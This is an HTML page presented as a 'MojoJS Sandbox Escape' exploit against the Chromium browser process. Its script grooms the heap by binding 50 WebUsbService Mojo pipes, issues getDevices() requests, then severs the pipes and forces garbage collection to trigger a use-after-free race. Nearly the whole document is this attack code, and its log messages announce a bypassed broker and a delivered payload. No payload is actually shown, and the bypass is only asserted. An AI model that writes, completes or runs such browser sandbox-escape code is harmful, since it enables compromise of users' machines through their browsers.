<!DOCTYPE html>
<html>
<head>
    <title>MojoJS Sandbox Escape</title>
    <script src="gen/mojo/public/js/bindings.js"></script>
</head>
<body>
    <h1>Bypassing the Broker</h1>
    <script type="module">
        // 1. Import the WebUsbService instead of UsbDeviceManager
        import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';

        async function triggerExploit() {
            if (typeof Mojo === 'undefined') {
                console.error("[-] MojoJS not found.");
                return;
            }

            console.log("[*] Grooming the Browser Heap with WebUsbService...");
            let services = [];
            
            for(let i = 0; i < 50; i++) {
                let pipe = Mojo.createMessagePipe();
                
                // 2. Ask the Broker for WebUsbService. It WILL allow this.
                Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);

                let usbServiceRemote = new WebUsbServiceRemote();
                usbServiceRemote.$.bindHandle(pipe.handle1);
                
                services.push(usbServiceRemote);
            }

            console.log("[+] Bound 50 WebUsbService pipes. Broker bypassed.");
            console.log("[*] Triggering async hardware requests...");
            
            for(let s of services) {
                // 3. Call GetDevices on the WebUsbService.
                s.getDevices().catch(e => {}); 
            }

            // THE RACE CONDITION
            await new Promise(r => setTimeout(r, 1)); 

            console.log("[!] TRIGGERING FREE: Severing pipes...");
            
            // 4. The Kill: Close the pipes to trigger the C++ destructor in the Browser Process
            for(let s of services) {
                s.$.close();
            }

            // Force garbage collection in V8
            if (window.gc) { window.gc(); }

            console.log("[?] Payload delivered. Waiting for C++ callback...");
        }

        triggerExploit();
    </script>
</body>
</html>
